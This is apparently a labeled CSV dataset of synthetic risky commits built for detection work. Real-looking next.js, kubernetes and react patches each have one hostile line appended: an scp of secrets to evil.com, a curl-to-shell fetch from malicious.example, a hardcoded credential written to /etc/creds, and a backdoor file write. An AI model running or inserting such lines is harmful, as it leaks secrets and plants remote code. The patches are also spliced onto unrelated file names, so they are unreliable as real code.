repository,commit_sha,author,timestamp,message,filename,additions,deletions,changes,patch,risky_label
vercel/next.js,synthetic_0_2824,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,18,3,21,"""**/*.ts"" ""**/*.tsx"" "".next/types/**/*.ts"" + "".next/dev/types/**/*.ts"" ""**/*.mts"" ] ""exclude"": [""node_modules""]
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_1_3286,Benjamin Elder,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,7,10,17,"func AfterSuiteActions(ctx context.Context) { if framework.TestContext.ReportDir != """" { framework.CoreDump(framework.TestContext.ReportDir) } + // TODO: nothing is using this? what should we do with it? if framework.TestContext.GatherSuiteMetricsAfterTest { if err := gatherTestSuiteMetrics(ctx); err != nil { framework.Logf(""Error gathering metrics: %v"" err)
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_2_2424,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,28,0,28,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import {mutate} from 'shared-runtime';
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_3_2535,Zack Tanner,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,15,8,23,"describe('app dir client cache semantics (experimental staleTimes)' () => { it('should re-use the cache for 5 minutes (default ""static"" time)' async () => { const browser = await next.browser('/' browserConfigWithFixedTime) + // Wait for the prefetch to complete before clicking + await browser.waitForIdleNetwork() + let initialRandomNumber = await browser .elementByCss('[href=""/0?timeout=0""]') .click() describe('app dir client cache semantics (experimental staleTimes)' () => { it('should use the custom static override time (3 minutes)' async () => { const browser = await next.browser('/' browserConfigWithFixedTime) + // Wait for the prefetch to complete before clicking + await browser.waitForIdleNetwork() + let initialRandomNumber = await browser .elementByCss('[href=""/0?timeout=0""]') .click()
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_4_1434,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,13,10,23,"function getChildFormatContext(parentContext type props) { } return 6 <= parentContext.insertionMode || 2 > parentContext.insertionMode ? createFormatContext(2 null subtreeScope null) - : parentContext.tagScope !== subtreeScope + : null !== parentContext.viewTransition || + parentContext.tagScope !== subtreeScope ? createFormatContext( parentContext.insertionMode parentContext.selectedValue function getSuspenseContentFormatContext(resumableState parentContext) { resumableState ); } +function makeId(resumableState treeId localId) { + resumableState = ""_"" + resumableState.idPrefix + ""R_"" + treeId; + 0 < localId && (resumableState += ""H"" + localId.toString(32)); + return resumableState + ""_""; +} var textSeparator = stringToPrecomputedChunk(""\x3c!-- --\x3e""); function pushTextInstance(target text renderState textEmbedded) { if ("""" === text) return textEmbedded; textEmbedded && target.push(textSeparator); target.push(stringToChunk(escapeTextForBrowser(text))); return !0; } +function pushViewTransitionAttributes(target formatContext) { + formatContext = formatContext.viewTransition; + null !== formatContext && + (""auto"" !== formatContext.name && + (pushStringAttribute( + target + ""vt-name"" + 0 === formatContext.nameIdx + ? formatContext.name + : formatContext.name + ""_"" + formatContext.nameIdx + ) + formatContext.nameIdx++) + pushStringAttribute(target ""vt-update"" formatContext.update) + ""none"" !== formatContext.enter && + pushStringAttribute(target ""vt-enter"" formatContext.enter) + ""none"" !== formatContext.exit && + pushStringAttribute(target ""vt-exit"" formatContext.exit) + ""none"" !== formatContext.share && + pushStringAttribute(target ""vt-share"" formatContext.share)); +} var styleNameCache = new Map() styleAttributeStart = stringToPrecomputedChunk(' style=""') styleAssign = stringToPrecomputedChunk("":"") var styleRegex = /(<\/|<)(s)(tyle)/gi; function styleReplacer(match prefix s suffix) { return """" + prefix + (""s"" === s ? ""\\73 "" : ""\\53 "") + suffix; } -function pushSelfClosing(target props tag) { +function pushSelfClosing(target props tag formatContext) { target.push(startChunkForTag(tag)); for (var propKey in props) if (hasOwnProperty.call(props propKey)) { function pushSelfClosing(target props tag) { pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTagSelfClosing); return null; } function pushScriptImpl(target props) { target.push(endChunkForTag(""script"")); return null; } -function pushStartSingletonElement(target props tag) { +function pushStartSingletonElement(target props tag formatContext) { target.push(startChunkForTag(tag)); var innerHTML = (tag = null) propKey; function pushStartSingletonElement(target props tag) { pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTag); pushInnerHTML(target innerHTML tag); return tag; } -function pushStartGenericElement(target props tag) { +function pushStartGenericElement(target props tag formatContext) { target.push(startChunkForTag(tag)); var innerHTML = (tag = null) propKey; function pushStartGenericElement(target props tag) { pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTag); pushInnerHTML(target innerHTML tag); return ""string"" === typeof tag function pushStartInstance( pushAttribute(target$jscomp$0 propKey propValue); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML children); if (""string"" === typeof children) { function pushStartInstance( ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML$jscomp$0 children$jscomp$0); return children$jscomp$0; function pushStartInstance( null === value$jscomp$0 && null !== defaultValue && (value$jscomp$0 = defaultValue); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); if (null != children$jscomp$2) { if (null != value$jscomp$0) throw Error(formatProdErrorMessage(92)); function pushStartInstance( ? pushAttribute(target$jscomp$0 ""value"" value$jscomp$1) : null !== defaultValue$jscomp$0 && pushAttribute(target$jscomp$0 ""value"" defaultValue$jscomp$0); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTagSelfClosing); null != formData && formData.forEach(pushAdditionalFormField target$jscomp$0); function pushStartInstance( formTarget$jscomp$0 name$jscomp$0 ); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); null != formData$jscomp$0 && formData$jscomp$0.forEach(pushAdditionalFormField target$jscomp$0); function pushStartInstance( pushAttribute(target$jscomp$0 ""method"" formMethod$jscomp$1); null != formTarget$jscomp$1 && pushAttribute(target$jscomp$0 ""target"" formTarget$jscomp$1); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); null !== formActionName && (target$jscomp$0.push(startHiddenInputChunk) function pushStartInstance( ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); return null; case ""object"": function pushStartInstance( ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML$jscomp$4 children$jscomp$5); if (""string"" === typeof children$jscomp$5) { function pushStartInstance( var JSCompiler_inline_result$jscomp$7 = pushSelfClosing( target$jscomp$0 props - ""meta"" + ""meta"" + formatContext ); else textEmbedded && target$jscomp$0.push(textSeparator) (JSCompiler_inline_result$jscomp$7 = isFallback$jscomp$1 ? null : ""string"" === typeof props.charSet - ? pushSelfClosing(renderState.charsetChunks props ""meta"") + ? pushSelfClosing( + renderState.charsetChunks + props + ""meta"" + formatContext + ) : ""viewport"" === props.name - ? pushSelfClosing(renderState.viewportChunks props ""meta"") - : pushSelfClosing(renderState.hoistableChunks props ""meta"")); + ? pushSelfClosing( + renderState.viewportChunks + props + ""meta"" + formatContext + ) + : pushSelfClosing( + renderState.hoistableChunks + props + ""meta"" + formatContext + )); return JSCompiler_inline_result$jscomp$7; case ""listing"": case ""pre"": function pushStartInstance( ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); if (null != innerHTML$jscomp$7) { if (null != children$jscomp$8) throw Error(formatProdErrorMessage(60)); function pushStartInstance( promotablePreloads.set(key$jscomp$0 resource$jscomp$1))); } } - return pushSelfClosing(target$jscomp$0 props ""img""); + return pushSelfClosing(target$jscomp$0 props ""img"" formatContext); case ""base"": case ""area"": case ""br"": function pushStartInstance( case ""source"": case ""track"": case ""wbr"": - return pushSelfClosing(target$jscomp$0 props type); + return pushSelfClosing(target$jscomp$0 props type formatContext); case ""annotation-xml"": case ""color-profile"": case ""font-face"": function pushStartInstance( var JSCompiler_inline_result$jscomp$9 = pushStartSingletonElement( preamble.headChunks props - ""head"" + ""head"" + formatContext ); } else JSCompiler_inline_result$jscomp$9 = pushStartGenericElement( target$jscomp$0 props - ""head"" + ""head"" + formatContext ); return JSCompiler_inline_result$jscomp$9; case ""body"": function pushStartInstance( var JSCompiler_inline_result$jscomp$10 = pushStartSingletonElement( preamble$jscomp$0.bodyChunks props - ""body"" + ""body"" + formatContext ); } else JSCompiler_inline_result$jscomp$10 = pushStartGenericElement( target$jscomp$0 props - ""body"" + ""body"" + formatContext ); return JSCompiler_inline_result$jscomp$10; case ""html"": function pushStartInstance( var JSCompiler_inline_result$jscomp$11 = pushStartSingletonElement( preamble$jscomp$1.htmlChunks props - ""html"" + ""html"" + formatContext ); } else JSCompiler_inline_result$jscomp$11 = pushStartGenericElement( target$jscomp$0 props - ""html"" + ""html"" + formatContext ); return JSCompiler_inline_result$jscomp$11; default: function pushStartInstance( } } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML$jscomp$8 children$jscomp$9); return children$jscomp$9; } } - return pushStartGenericElement(target$jscomp$0 props type); + return pushStartGenericElement(target$jscomp$0 props type formatContext); } var endTagCache = new Map(); function endChunkForTag(tag) { var completeSegmentScript1Full = stringToPrecomputedChunk( stringToPrecomputedChunk('<template data-rsi="""" data-sid=""'); stringToPrecomputedChunk('"" data-pid=""'); var completeBoundaryScriptFunctionOnly = stringToPrecomputedChunk( - '$RB=[];$RV=function(a){$RT=performance.now();for(var b=0;b<a.length;b+=2){var c=a[b] e=a[b+1];null!==e.parentNode&&e.parentNode.removeChild(e);var f=c.parentNode;if(f){var g=c.previousSibling h=0;do{if(c&&8===c.nodeType){var d=c.data;if(""/$""===d||""/&""===d)if(0===h)break;else h--;else""$""!==d&&""$?""!==d&&""$~""!==d&&""$!""!==d&&""&""!==d||h++}d=c.nextSibling;f.removeChild(c);c=d}while(c);for(;e.firstChild;)f.insertBefore(e.firstChild c);g.data=""$"";g._reactRetry&&requestAnimationFrame(g._reactRetry)}}a.length=0};\n$RC=function(a b){if(b=document.getElementById(b))(a=document.getElementById(a))?(a.previousSibling.data=""$~"" $RB.push(a b) 2===$RB.length&&(""number""!==typeof $RT?requestAnimationFrame($RV.bind(null $RB)):(a=performance.now() setTimeout($RV.bind(null $RB) 2300>a&&2E3<a?2300-a:$RT+300-a)))):b.parentNode.removeChild(b)};' -); -stringToChunk( - '$RV=function(A g){function k(a b){var e=a.getAttribute(b);e&&(b=a.style l.push(a b.viewTransitionName b.viewTransitionClass) ""auto""!==e&&(b.viewTransitionClass=e) (a=a.getAttribute(""vt-name""))||(a=""_T_""+K++ +""_"") b.viewTransitionName=a B=!0)}var B=!1 K=0 l=[];try{var f=document.__reactViewTransition;if(f){f.finished.finally($RV.bind(null g));return}var m=new Map;for(f=1;f<g.length;f+=2)for(var h=g[f].querySelectorAll(""[vt-share]"") d=0;d<h.length;d++){var c=h[d];m.set(c.getAttribute(""vt-name"") c)}var u=[];for(h=0;h<g.length;h+=2){var C=g[h] x=C.parentNode;if(x){var v=x.getBoundingClientRect();if(v.left||v.top||v.width||v.height){c=C;for(f=0;c;){if(8===c.nodeType){var r=c.data;if(""/$""===r)if(0===f)break;else f--;else""$""!==r&&""$?""!==r&&""$~""!==r&&""$!""!==r||f++}else if(1===c.nodeType){d=c;var D=d.getAttribute(""vt-name"") y=m.get(D);k(d y?""vt-share"":""vt-exit"");y&&(k(y ""vt-share"") m.set(D null));var E=d.querySelectorAll(""[vt-share]"");for(d=0;d<E.length;d++){var F=E[d] G=F.getAttribute(""vt-name"") \nH=m.get(G);H&&(k(F ""vt-share"") k(H ""vt-share"") m.set(G null))}}c=c.nextSibling}for(var I=g[h+1] t=I.firstElementChild;t;)null!==m.get(t.getAttribute(""vt-name""))&&k(t ""vt-enter"") t=t.nextElementSibling;c=x;do for(var n=c.firstElementChild;n;){var J=n.getAttribute(""vt-update"");J&&""none""!==J&&!l.includes(n)&&k(n ""vt-update"");n=n.nextElementSibling}while((c=c.parentNode)&&1===c.nodeType&&""none""!==c.getAttribute(""vt-update""));u.push.apply(u I.querySelectorAll(\'img[src]:not([loading=""lazy""])\'))}}}if(B){var z=\ndocument.__reactViewTransition=document.startViewTransition({update:function(){A(g);for(var a=[document.documentElement.clientHeight document.fonts.ready] b={} e=0;e<u.length;b={g:b.g} e++)if(b.g=u[e] !b.g.complete){var p=b.g.getBoundingClientRect();0<p.bottom&&0<p.right&&p.top<window.innerHeight&&p.left<window.innerWidth&&(p=new Promise(function(w){return function(q){w.g.addEventListener(""load"" q);w.g.addEventListener(""error"" q)}}(b)) a.push(p))}return Promise.race([Promise.all(a) new Promise(function(w){var q=\nperformance.now();setTimeout(w 2300>q&&2E3<q?2300-q:500)})])} types:[]});z.ready.finally(function(){for(var a=l.length-3;0<=a;a-=3){var b=l[a] e=b.style;e.viewTransitionName=l[a+1];e.viewTransitionClass=l[a+1];""""===b.getAttribute(""style"")&&b.removeAttribute(""style"")}});z.finished.finally(function(){document.__reactViewTransition===z&&(document.__reactViewTransition=null)});$RB=[];return}}catch(a){}A(g)}.bind(null $RV);' -); -var completeBoundaryScript1Partial = stringToPrecomputedChunk('$RC(""') + '$RB=[];$RV=function(a){$RT=performance.now();for(var b=0;b<a.length;b+=2){var c=a[b] e=a[b+1];null!==e.parentNode&&e.parentNode.removeChild(e);var f=c.parentNode;if(f){var g=c.previousSibling h=0;do{if(c&&8===c.nodeType){var d=c.data;if(""/$""===d||""/&""===d)if(0===h)break;else h--;else""$""!==d&&""$?""!==d&&""$~""!==d&&""$!""!==d&&""&""!==d||h++}d=c.nextSibling;f.removeChild(c);c=d}while(c);for(;e.firstChild;)f.insertBefore(e.firstChild c);g.data=""$"";g._reactRetry&&requestAnimationFrame(g._reactRetry)}}a.length=0};\n$RC=function(a b){if(b=document.getElementById(b))(a=document.getElementById(a))?(a.previousSibling.data=""$~"" $RB.push(a b) 2===$RB.length&&(""number""!==typeof $RT?requestAnimationFrame($RV.bind(null $RB)):(a=performance.now() setTimeout($RV.bind(null $RB) 2300>a&&2E3<a?2300-a:$RT+300-a)))):b.parentNode.removeChild(b)};' + ) + completeBoundaryUpgradeToViewTransitionsInstruction = stringToChunk( + '$RV=function(A g){function k(a b){var e=a.getAttribute(b);e&&(b=a.style l.push(a b.viewTransitionName b.viewTransitionClass) ""auto""!==e&&(b.viewTransitionClass=e) (a=a.getAttribute(""vt-name""))||(a=""_T_""+K++ +""_"") b.viewTransitionName=a B=!0)}var B=!1 K=0 l=[];try{var f=document.__reactViewTransition;if(f){f.finished.finally($RV.bind(null g));return}var m=new Map;for(f=1;f<g.length;f+=2)for(var h=g[f].querySelectorAll(""[vt-share]"") d=0;d<h.length;d++){var c=h[d];m.set(c.getAttribute(""vt-name"") c)}var u=[];for(h=0;h<g.length;h+=2){var C=g[h] x=C.parentNode;if(x){var v=x.getBoundingClientRect();if(v.left||v.top||v.width||v.height){c=C;for(f=0;c;){if(8===c.nodeType){var r=c.data;if(""/$""===r)if(0===f)break;else f--;else""$""!==r&&""$?""!==r&&""$~""!==r&&""$!""!==r||f++}else if(1===c.nodeType){d=c;var D=d.getAttribute(""vt-name"") y=m.get(D);k(d y?""vt-share"":""vt-exit"");y&&(k(y ""vt-share"") m.set(D null));var E=d.querySelectorAll(""[vt-share]"");for(d=0;d<E.length;d++){var F=E[d] G=F.getAttribute(""vt-name"") \nH=m.get(G);H&&(k(F ""vt-share"") k(H ""vt-share"") m.set(G null))}}c=c.nextSibling}for(var I=g[h+1] t=I.firstElementChild;t;)null!==m.get(t.getAttribute(""vt-name""))&&k(t ""vt-enter"") t=t.nextElementSibling;c=x;do for(var n=c.firstElementChild;n;){var J=n.getAttribute(""vt-update"");J&&""none""!==J&&!l.includes(n)&&k(n ""vt-update"");n=n.nextElementSibling}while((c=c.parentNode)&&1===c.nodeType&&""none""!==c.getAttribute(""vt-update""));u.push.apply(u I.querySelectorAll(\'img[src]:not([loading=""lazy""])\'))}}}if(B){var z=\ndocument.__reactViewTransition=document.startViewTransition({update:function(){A(g);for(var a=[document.documentElement.clientHeight document.fonts.ready] b={} e=0;e<u.length;b={g:b.g} e++)if(b.g=u[e] !b.g.complete){var p=b.g.getBoundingClientRect();0<p.bottom&&0<p.right&&p.top<window.innerHeight&&p.left<window.innerWidth&&(p=new Promise(function(w){return function(q){w.g.addEventListener(""load"" q);w.g.addEventListener(""error"" q)}}(b)) a.push(p))}return Promise.race([Promise.all(a) new Promise(function(w){var q=\nperformance.now();setTimeout(w 2300>q&&2E3<q?2300-q:500)})])} types:[]});z.ready.finally(function(){for(var a=l.length-3;0<=a;a-=3){var b=l[a] e=b.style;e.viewTransitionName=l[a+1];e.viewTransitionClass=l[a+1];""""===b.getAttribute(""style"")&&b.removeAttribute(""style"")}});z.finished.finally(function(){document.__reactViewTransition===z&&(document.__reactViewTransition=null)});$RB=[];return}}catch(a){}A(g)}.bind(null $RV);' + ) + completeBoundaryScript1Partial = stringToPrecomputedChunk('$RC(""') completeBoundaryWithStylesScript1FullPartial = stringToPrecomputedChunk( '$RM=new Map;$RR=function(n w p){function u(q){this._p=null;q()}for(var r=new Map t=document h b e=t.querySelectorAll(""link[data-precedence] style[data-precedence]"") v=[] k=0;b=e[k++];)""not all""===b.getAttribute(""media"")?v.push(b):(""LINK""===b.tagName&&$RM.set(b.getAttribute(""href"") b) r.set(b.dataset.precedence h=b));e=0;b=[];var l a;for(k=!0;;){if(k){var f=p[e++];if(!f){k=!1;e=0;continue}var c=!1 m=0;var d=f[m++];if(a=$RM.get(d)){var g=a._p;c=!0}else{a=t.createElement(""link"");a.href=d;a.rel=\n""stylesheet"";for(a.dataset.precedence=l=f[m++];g=f[m++];)a.setAttribute(g f[m++]);g=a._p=new Promise(function(q x){a.onload=u.bind(a q);a.onerror=u.bind(a x)});$RM.set(d a)}d=a.getAttribute(""media"");!g||d&&!matchMedia(d).matches||b.push(g);if(c)continue}else{a=v[e++];if(!a)break;l=a.getAttribute(""data-precedence"");a.removeAttribute(""media"")}c=r.get(l)||h;c===h&&(h=a);r.set(l a);c?c.parentNode.insertBefore(a c.nextSibling):(c=t.head c.insertBefore(a c.firstChild))}if(p=document.getElementById(n))p.previousSibling.data=\n""$~"";Promise.all(b).then($RC.bind(null n w) $RX.bind(null n ""CSS failed to load""))};$RR(""' ) function getComponentNameFromType(type) { return ""SuspenseList""; case REACT_ACTIVITY_TYPE: return ""Activity""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) { var classComponentUpdater = { enqueueForceUpdate: function () {} } emptyTreeContext = { id: 1 overflow: """" }; +function getTreeId(context) { + var overflow = context.overflow; + context = context.id; + return (context & ~(1 << (32 - clz32(context) - 1))).toString(32) + overflow; +} function pushTreeContext(baseContext totalChildren index) { var baseIdWithLeadingBit = baseContext.id; baseContext = baseContext.overflow; var HooksDispatcher = { return [!1 unsupportedStartTransition]; } useId: function () { - var JSCompiler_inline_result = currentlyRenderingTask.treeContext; - var overflow = JSCompiler_inline_result.overflow; - JSCompiler_inline_result = JSCompiler_inline_result.id; - JSCompiler_inline_result = - ( - JSCompiler_inline_result & - ~(1 << (32 - clz32(JSCompiler_inline_result) - 1)) - ).toString(32) + overflow; - var resumableState = currentResumableState; + var treeId = getTreeId(currentlyRenderingTask.treeContext) + resumableState = currentResumableState; if (null === resumableState) throw Error(formatProdErrorMessage(404)); - overflow = localIdCounter++; - JSCompiler_inline_result = - ""_"" + resumableState.idPrefix + ""R_"" + JSCompiler_inline_result; - 0 < overflow && (JSCompiler_inline_result += ""H"" + overflow.toString(32)); - return JSCompiler_inline_result + ""_""; + var localId = localIdCounter++; + return makeId(resumableState treeId localId); } useSyncExternalStore: function (subscribe getSnapshot getServerSnapshot) { if (void 0 === getServerSnapshot) function describeComponentStackByType(type) { return describeBuiltInComponentFrame(""SuspenseList""); case REACT_SUSPENSE_TYPE: return describeBuiltInComponentFrame(""Suspense""); + case REACT_VIEW_TRANSITION_TYPE: + return describeBuiltInComponentFrame(""ViewTransition""); } return """"; } +function getViewTransitionClassName(defaultClass eventClass) { + defaultClass = + null == defaultClass || ""string"" === typeof defaultClass + ? defaultClass + : defaultClass.default; + eventClass = + null == eventClass || ""string"" === typeof eventClass + ? eventClass + : eventClass.default; + return null == eventClass + ? ""auto"" === defaultClass + ? null + : defaultClass + : ""auto"" === eventClass + ? null + : eventClass; +} function isEligibleForOutlining(request boundary) { return ( (500 < boundary.byteSize || hasSuspenseyContent(boundary.contentState)) && function renderElement(request task keyPath type props ref) { void 0 === newProps[propName$44] && (newProps[propName$44] = defaultProps[propName$44]); } - props = newProps; - newProps = emptyContextObject; - defaultProps = type.contextType; - ""object"" === typeof defaultProps && - null !== defaultProps && - (newProps = defaultProps._currentValue); - newProps = new type(props newProps); - var initialState = void 0 !== newProps.state ? newProps.state : null; - newProps.updater = classComponentUpdater; - newProps.props = props; - newProps.state = initialState; - defaultProps = { queue: [] replace: !1 }; - newProps._reactInternals = defaultProps; - ref = type.contextType; - newProps.context = - ""object"" === typeof ref && null !== ref - ? ref._currentValue + var JSCompiler_inline_result = newProps; + var context = emptyContextObject + contextType = type.contextType; + ""object"" === typeof contextType && + null !== contextType && + (context = contextType._currentValue); + var JSCompiler_inline_result$jscomp$0 = new type( + JSCompiler_inline_result + context + ); + var initialState = + void 0 !== JSCompiler_inline_result$jscomp$0.state + ? JSCompiler_inline_result$jscomp$0.state + : null; + JSCompiler_inline_result$jscomp$0.updater = classComponentUpdater; + JSCompiler_inline_result$jscomp$0.props = JSCompiler_inline_result; + JSCompiler_inline_result$jscomp$0.state = initialState; + var internalInstance = { queue: [] replace: !1 }; + JSCompiler_inline_result$jscomp$0._reactInternals = internalInstance; + var contextType$jscomp$0 = type.contextType; + JSCompiler_inline_result$jscomp$0.context = + ""object"" === typeof contextType$jscomp$0 && + null !== contextType$jscomp$0 + ? contextType$jscomp$0._currentValue : emptyContextObject; - ref = type.getDerivedStateFromProps; - ""function"" === typeof ref && - ((ref = ref(props initialState)) - (initialState = - null === ref || void 0 === ref + var getDerivedStateFromProps = type.getDerivedStateFromProps; + if (""function"" === typeof getDerivedStateFromProps) { + var partialState = getDerivedStateFromProps( + JSCompiler_inline_result + initialState + ); + var JSCompiler_inline_result$jscomp$1 = + null === partialState || void 0 === partialState ? initialState - : assign({} initialState ref)) - (newProps.state = initialState)); + : assign({} initialState partialState); + JSCompiler_inline_result$jscomp$0.state = + JSCompiler_inline_result$jscomp$1; + } if ( ""function"" !== typeof type.getDerivedStateFromProps && - ""function"" !== typeof newProps.getSnapshotBeforeUpdate && - (""function"" === typeof newProps.UNSAFE_componentWillMount || - ""function"" === typeof newProps.componentWillMount) - ) + ""function"" !== + typeof JSCompiler_inline_result$jscomp$0.getSnapshotBeforeUpdate && + (""function"" === + typeof JSCompiler_inline_result$jscomp$0.UNSAFE_componentWillMount || + ""function"" === + typeof JSCompiler_inline_result$jscomp$0.componentWillMount) + ) { + var oldState = JSCompiler_inline_result$jscomp$0.state; + ""function"" === + typeof JSCompiler_inline_result$jscomp$0.componentWillMount && + JSCompiler_inline_result$jscomp$0.componentWillMount(); + ""function"" === + typeof JSCompiler_inline_result$jscomp$0.UNSAFE_componentWillMount && + JSCompiler_inline_result$jscomp$0.UNSAFE_componentWillMount(); + oldState !== JSCompiler_inline_result$jscomp$0.state && + classComponentUpdater.enqueueReplaceState( + JSCompiler_inline_result$jscomp$0 + JSCompiler_inline_result$jscomp$0.state + null + ); if ( - ((type = newProps.state) - ""function"" === typeof newProps.componentWillMount && - newProps.componentWillMount() - ""function"" === typeof newProps.UNSAFE_componentWillMount && - newProps.UNSAFE_componentWillMount() - type !== newProps.state && - classComponentUpdater.enqueueReplaceState( - newProps - newProps.state - null - ) - null !== defaultProps.queue && 0 < defaultProps.queue.length) - ) - if ( - ((type = defaultProps.queue) - (ref = defaultProps.replace) - (defaultProps.queue = null) - (defaultProps.replace = !1) - ref && 1 === type.length) - ) - newProps.state = type[0]; + null !== internalInstance.queue && + 0 < internalInstance.queue.length + ) { + var oldQueue = internalInstance.queue + oldReplace = internalInstance.replace; + internalInstance.queue = null; + internalInstance.replace = !1; + if (oldReplace && 1 === oldQueue.length) + JSCompiler_inline_result$jscomp$0.state = oldQueue[0]; else { - defaultProps = ref ? type[0] : newProps.state; - initialState = !0; - for (ref = ref ? 1 : 0; ref < type.length; ref++) - (propName$44 = type[ref]) - (propName$44 = - ""function"" === typeof propName$44 - ? propName$44.call(newProps defaultProps props void 0) - : propName$44) - null != propName$44 && - (initialState - ? ((initialState = !1) - (defaultProps = assign({} defaultProps propName$44))) - : assign(defaultProps propName$44)); - newProps.state = defaultProps; + for ( + var nextState = oldReplace + ? oldQueue[0] + : JSCompiler_inline_result$jscomp$0.state + dontMutate = !0 + i = oldReplace ? 1 : 0; + i < oldQueue.length; + i++ + ) { + var partial = oldQueue[i] + partialState$jscomp$0 = + ""function"" === typeof partial + ? partial.call( + JSCompiler_inline_result$jscomp$0 + nextState + JSCompiler_inline_result + void 0 + ) + : partial; + null != partialState$jscomp$0 && + (dontMutate + ? ((dontMutate = !1) + (nextState = assign({} nextState partialState$jscomp$0))) + : assign(nextState partialState$jscomp$0)); + } + JSCompiler_inline_result$jscomp$0.state = nextState; } - else defaultProps.queue = null; - type = newProps.render(); + } else internalInstance.queue = null; + } + var nextChildren = JSCompiler_inline_result$jscomp$0.render(); if (12 === request.status) throw null; - props = task.keyPath; + var prevKeyPath = task.keyPath; task.keyPath = keyPath; - renderNodeDestructive(request task type -1); - task.keyPath = props; + renderNodeDestructive(request task nextChildren -1); + task.keyPath = prevKeyPath; } else { - type = renderWithHooks(request task keyPath type props void 0); + var value = renderWithHooks(request task keyPath type props void 0); if (12 === request.status) throw null; finishFunctionComponent( request task keyPath - type + value 0 !== localIdCounter actionStateCounter actionStateMatchingIndex ); } - else if (""string"" === typeof type) - if (((newProps = task.blockedSegment) null === newProps)) - (newProps = props.children) - (defaultProps = task.formatContext) - (initialState = task.keyPath) - (task.formatContext = getChildFormatContext(defaultProps type props)) - (task.keyPath = keyPath) - renderNode(request task newProps -1) - (task.formatContext = defaultProps) - (task.keyPath = initialState); - else { - initialState = pushStartInstance( - newProps.chunks + else if (""string"" === typeof type) { + var segment = task.blockedSegment; + if (null === segment) { + var children = props.children + prevContext = task.formatContext + prevKeyPath$jscomp$0 = task.keyPath; + task.formatContext = getChildFormatContext(prevContext type props); + task.keyPath = keyPath; + renderNode(request task children -1); + task.formatContext = prevContext; + task.keyPath = prevKeyPath$jscomp$0; + } else { + var children$41 = pushStartInstance( + segment.chunks type props request.resumableState request.renderState task.blockedPreamble task.hoistableState task.formatContext - newProps.lastPushedText + segment.lastPushedText ); - newProps.lastPushedText = !1; - defaultProps = task.formatContext; - ref = task.keyPath; + segment.lastPushedText = !1; + var prevContext$42 = task.formatContext + prevKeyPath$43 = task.keyPath; task.keyPath = keyPath; if ( 3 === - (task.formatContext = getChildFormatContext(defaultProps type props)) - .insertionMode + (task.formatContext = getChildFormatContext( + prevContext$42 + type + props + )).insertionMode ) { - keyPath = createPendingSegment( + var preambleSegment = createPendingSegment( request 0 null task.formatContext !1 !1 ); - newProps.preambleChildren.push(keyPath); - task.blockedSegment = keyPath; + segment.preambleChildren.push(preambleSegment); + task.blockedSegment = preambleSegment; try { - (keyPath.status = 6) - renderNode(request task initialState -1) - keyPath.lastPushedText && - keyPath.textEmbedded && - keyPath.chunks.push(textSeparator) - (keyPath.status = 1) - finishedSegment(request task.blockedBoundary keyPath); + (preambleSegment.status = 6) + renderNode(request task children$41 -1) + preambleSegment.lastPushedText && + preambleSegment.textEmbedded && + preambleSegment.chunks.push(textSeparator) + (preambleSegment.status = 1) + finishedSegment(request task.blockedBoundary preambleSegment); } finally { - task.blockedSegment = newProps; + task.blockedSegment = segment; } - } else renderNode(request task initialState -1); - task.formatContext = defaultProps; - task.keyPath = ref; + } else renderNode(request task children$41 -1); + task.formatContext = prevContext$42; + task.keyPath = prevKeyPath$43; a: { - task = newProps.chunks; - request = request.resumableState; + var target = segment.chunks + resumableState = request.resumableState; switch (type) { case ""title"": case ""style"": function renderElement(request task keyPath type props ref) { case ""wbr"": break a; case ""body"": - if (1 >= defaultProps.insertionMode) { - request.hasBody = !0; + if (1 >= prevContext$42.insertionMode) { + resumableState.hasBody = !0; break a; } break; case ""html"": - if (0 === defaultProps.insertionMode) { - request.hasHtml = !0; + if (0 === prevContext$42.insertionMode) { + resumableState.hasHtml = !0; break a; } break; case ""head"": - if (1 >= defaultProps.insertionMode) break a; + if (1 >= prevContext$42.insertionMode) break a; } - task.push(endChunkForTag(type)); + target.push(endChunkForTag(type)); } - newProps.lastPushedText = !1; + segment.lastPushedText = !1; } - else { + } else { switch (type) { case REACT_LEGACY_HIDDEN_TYPE: case REACT_STRICT_MODE_TYPE: case REACT_PROFILER_TYPE: case REACT_FRAGMENT_TYPE: - type = task.keyPath; + var prevKeyPath$jscomp$1 = task.keyPath; task.keyPath = keyPath; renderNodeDestructive(request task props.children -1); - task.keyPath = type; + task.keyPath 